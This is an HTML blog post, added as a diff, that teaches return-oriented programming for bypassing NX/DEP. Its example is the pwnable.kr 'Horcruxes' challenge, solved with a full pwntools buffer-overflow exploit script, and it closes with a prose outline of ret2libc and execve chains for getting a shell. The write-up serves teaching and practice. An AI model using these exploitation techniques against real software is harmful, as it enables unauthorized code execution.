@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    
+    <meta name="description" content="Bypassing NX and DEPSo lets talk about ROP, virtually every compiler nowadays secures programs by adding NX and DEP attributes which means the memory is either writable or executable but never both. Y">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Return Oriented Programming: Exploitation Without Execution">
+<meta property="og:url" content="https://ran-var.github.io/blog/2025/10/05/rop/">
+<meta property="og:site_name" content="Ran Varshaver">
+<meta property="og:description" content="Bypassing NX and DEPSo lets talk about ROP, virtually every compiler nowadays secures programs by adding NX and DEP attributes which means the memory is either writable or executable but never both. Y">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-10-05T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-05T13:38:42.635Z">
+<meta property="article:author" content="Ran Varshaver">
+<meta name="twitter:card" content="summary">
+    
+    
+    
+    
+      
+        <link rel="shortcut icon" href="/images/favicon.ico">
+      
+      
+        <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+      
+      
+        <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+      
+    
+
+    <title>Return Oriented Programming: Exploitation Without Execution</title>
+
+    <!-- async scripts -->
+    
+    
+
+    
+<link rel="stylesheet" href="/blog/css/style.css">
+
+
+    
+
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/blog/2025/09/16/xml-overflow/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ran-var.github.io/blog/2025/10/05/rop/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ran-var.github.io/blog/2025/10/05/rop/&text=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ran-var.github.io/blog/2025/10/05/rop/&title=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ran-var.github.io/blog/2025/10/05/rop/&is_video=false&description=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Return Oriented Programming: Exploitation Without Execution&body=Check out this article: https://ran-var.github.io/blog/2025/10/05/rop/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ran-var.github.io/blog/2025/10/05/rop/&title=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ran-var.github.io/blog/2025/10/05/rop/&title=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ran-var.github.io/blog/2025/10/05/rop/&title=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ran-var.github.io/blog/2025/10/05/rop/&title=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ran-var.github.io/blog/2025/10/05/rop/&name=Return Oriented Programming: Exploitation Without Execution&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ran-var.github.io/blog/2025/10/05/rop/&t=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypassing-NX-and-DEP"><span class="toc-number">1.</span> <span class="toc-text">Bypassing NX and DEP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-ROP-Works-Under-the-Hood"><span class="toc-number">2.</span> <span class="toc-text">How ROP Works Under the Hood</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#So-What%E2%80%99s-a-Gadget-Chain"><span class="toc-number">3.</span> <span class="toc-text">So What’s a Gadget Chain?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Practical-ROP-Chaining"><span class="toc-number">4.</span> <span class="toc-text">Practical ROP Chaining</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Vulnerability"><span class="toc-number">5.</span> <span class="toc-text">The Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-Weaponization"><span class="toc-number">6.</span> <span class="toc-text">ROP Weaponization</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <a href="/blog/" class="back-link">← Back</a>
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Return Oriented Programming: Exploitation Without Execution
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ran Varshaver</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-05T00:00:00.000Z" class="dt-published" itemprop="datePublished">05-10-2025</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Bypassing-NX-and-DEP"><a href="#Bypassing-NX-and-DEP" class="headerlink" title="Bypassing NX and DEP"></a>Bypassing NX and DEP</h2><p>So lets talk about ROP, virtually every compiler nowadays secures programs by adding <strong>NX</strong> and <strong>DEP</strong> attributes which means the memory is either writable or executable but never both. You can’t just inject shellcode onto the stack and have it executed, it will just kill the process.<br>This should have in theory ended stack based exploitation but it didn’t.</p>
+<h2 id="How-ROP-Works-Under-the-Hood"><a href="#How-ROP-Works-Under-the-Hood" class="headerlink" title="How ROP Works Under the Hood"></a>How ROP Works Under the Hood</h2><p>Here’s the thing, you don’t need to execute <em>new</em> code. The binary and it’s libraries already have tons of executable code that we are able to use to our advantage.<br>In the epilogue of each procedure we will always see something like this:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp ; both lines substituted as &#x27;leave&#x27; instruction on x64</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>The first two lines just clear up the local variables and restore the stack frame for the caller.<br>Now <code>ret</code> is the key instruction for ROP, you can think of it as sort of an abstraction for:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eip, [esp]</span><br></pre></td></tr></table></figure>
+<p>Normally this would contain the address of where this procedure was originally called so program execution continues as intended, but the CPU doesn’t really care if the address in <code>eip</code> belongs to the caller or not - <em>it just goes there</em>.<br>If you control the stack, you control where every <code>ret</code> goes. That’s the foundation of ROP.</p>
+<h2 id="So-What’s-a-Gadget-Chain"><a href="#So-What’s-a-Gadget-Chain" class="headerlink" title="So What’s a Gadget Chain?"></a>So What’s a Gadget Chain?</h2><p>A gadget is any sequence of instructions that ends in <code>ret</code>. They’re just snippets of existing code scattered across the binary and it’s libraries.<br>ROP chains work by overflowing a vulnerable function with arbitrary addresses so once the first gadget executes and hits it’s own <code>ret</code>, that instruction just pops off the next address we’ve provided in the chain and jumps to it. Each gadget’s <code>ret</code> becomes the bridge to the next gadget, you’re basically just hijacking the return mechanism to manipulate the control flow of the program.</p>
+<h2 id="Practical-ROP-Chaining"><a href="#Practical-ROP-Chaining" class="headerlink" title="Practical ROP Chaining"></a>Practical ROP Chaining</h2><p>A great example for this type of exploitation technique is the <strong>Horcruxes</strong> challenge from <a target="_blank" rel="noopener" href="https://pwnable.kr/play.php"><strong>pwnable.kr</strong></a>, although this isn’t really a writeup I’ll try to do my best to explain how this challenge goes.<br>For the sake of demonstartion the binary had PIE disabled so addresses would remain static and we could just copy them into our exploit.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=horcruxes</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   76 Symbols	  No	0		3		horcruxes</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>The binary initializes seven functions A-G with each of them storing a random value, and we need them sum of all these integers to receive the flag. However we cannot see those integers during regular execution since they are generated at runtime so we’ll need to jump to each of the seven functions one after the other to print them out <em>(see where we’re going?)</em>.<br>Another interesting point to clear up: <em>why couldn’t we just use the first gadget to jump to where the flag is printed?</em><br>The challenge’s author has accounted for this, and all addresses inside the <code>ropme</code> function contain a <code>0a</code> which converts into a newline, stopping the <code>puts</code> function which relies on newlines to figure out where the end of a string is.</p>
+<h2 id="The-Vulnerability"><a href="#The-Vulnerability" class="headerlink" title="The Vulnerability"></a>The Vulnerability</h2><p>Looking at the disassembly, the <code>ropme</code> function has a classic buffer overflow via <code>gets()</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call   0x8041080 &lt;gets@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>No bounds checking, no canary. We can overflow straight into the saved return address.<br>Now all we have to do is find the addresses <em>(remember, no PIE!)</em> of all the functions from A to G and create a chain that does the following:</p>
+<ol>
+<li>First things first - fills up the buffer(116) allocated for the <code>gets()</code> function plus saved <code>ebp</code>(4).</li>
+<li>Overflow with our address chain of the A-G functions.</li>
+<li>Add the address of where <code>ropme</code> is called from <code>main</code>, since we cannot jump to inside that function.</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_int</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./horcruxes&quot;</span>)</span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line">horcruxes = [</span><br><span class="line">    <span class="number">0x0804129d</span>,</span><br><span class="line">    <span class="number">0x080412cf</span>,</span><br><span class="line">    <span class="number">0x08041301</span>,</span><br><span class="line">    <span class="number">0x08041333</span>,</span><br><span class="line">    <span class="number">0x08041365</span>,</span><br><span class="line">    <span class="number">0x08041397</span>,</span><br><span class="line">    <span class="number">0x080413c9</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">ropme = <span class="number">0x080414fc</span></span><br><span class="line"></span><br><span class="line">exp = <span class="number">0</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Menu:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;123&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;earned? : &quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">116</span></span><br><span class="line">payload += <span class="string">b&quot;B&quot;</span>*<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> horcruxes:</span><br><span class="line">    payload += p32(addr)</span><br><span class="line"></span><br><span class="line">payload += p32(ropme)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;+&quot;</span>)</span><br><span class="line">    tmp = p.recvuntil(<span class="string">b&quot;)&quot;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    exp += <span class="built_in">int</span>(tmp)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;EXP sum: &quot;</span> + <span class="built_in">str</span>(c_int(exp).value))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Menu:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;123&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;earned? : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(c_int(exp).value).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>When <code>ropme</code> hits <code>ret</code> the chain begins starting at A, all the way to G, and back to ropme. Each function prints the random value, then we parse and sum handling the integer overflow. Submitting the sum back at the binary prints out the flag.</p>
+<h2 id="ROP-Weaponization"><a href="#ROP-Weaponization" class="headerlink" title="ROP Weaponization"></a>ROP Weaponization</h2><p>In the this challenge ROP was used primarily for control flow manipulation to leak values, but its real potential lies in achieving code execution. In real-world exploitation, ROP is the primary technique for bypassing Data Execution Prevention (DEP&#x2F;NX) and obtaining a shell. Here are two common routes for ROP weaponization:</p>
+<ol>
+<li>ret2libc&#x2F;direct call: use resolved libc addresses to call <code>system(&quot;/bin/sh&quot;)</code>, execve, or other libc helpers. Fast and compact when libc is known or leakable.</li>
+<li>Full ROP payloads: when you need more control, build a gadget chain to write strings into <code>.bss</code>, set up registers, and call <code>mprotect/mmap</code> or syscalls to change memory permissions or invoke <code>execve</code> directly. Stack pivot to a larger controlled buffer if the saved-return slot is too small.</li>
+</ol>
+<p>Whether you’re writing code or breaking it understanding how <code>ret</code> works, how the stack controls execution, and how code boundaries are really just conventions-that knowledge makes you better at your job. Because security isn’t about what <strong>code is supposed to do</strong>. It’s about what <strong>code can do</strong> when someone controls inputs you didn’t expect them to control.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypassing-NX-and-DEP"><span class="toc-number">1.</span> <span class="toc-text">Bypassing NX and DEP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-ROP-Works-Under-the-Hood"><span class="toc-number">2.</span> <span class="toc-text">How ROP Works Under the Hood</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#So-What%E2%80%99s-a-Gadget-Chain"><span class="toc-number">3.</span> <span class="toc-text">So What’s a Gadget Chain?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Practical-ROP-Chaining"><span class="toc-number">4.</span> <span class="toc-text">Practical ROP Chaining</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Vulnerability"><span class="toc-number">5.</span> <span class="toc-text">The Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-Weaponization"><span class="toc-number">6.</span> <span class="toc-text">ROP Weaponization</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ran-var.github.io/blog/2025/10/05/rop/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ran-var.github.io/blog/2025/10/05/rop/&text=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ran-var.github.io/blog/2025/10/05/rop/&title=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ran-var.github.io/blog/2025/10/05/rop/&is_video=false&description=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Return Oriented Programming: Exploitation Without Execution&body=Check out this article: https://ran-var.github.io/blog/2025/10/05/rop/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ran-var.github.io/blog/2025/10/05/rop/&title=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ran-var.github.io/blog/2025/10/05/rop/&title=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ran-var.github.io/blog/2025/10/05/rop/&title=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ran-var.github.io/blog/2025/10/05/rop/&title=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ran-var.github.io/blog/2025/10/05/rop/&name=Return Oriented Programming: Exploitation Without Execution&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ran-var.github.io/blog/2025/10/05/rop/&t=Return Oriented Programming: Exploitation Without Execution"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025
+    Ran Varshaver
+  </div>
+  <div class="footer-right">
+  </div>
+</footer>
+
+    </div>
+    
+
+ 
+  <link
+    rel="preload"
+    href="/blog/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/blog/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    
+  
+<script src="/blog/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+
+  
+    
+<script src="/blog/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/blog/js/main.js"></script>
+
+
+
+</body>
+</html>
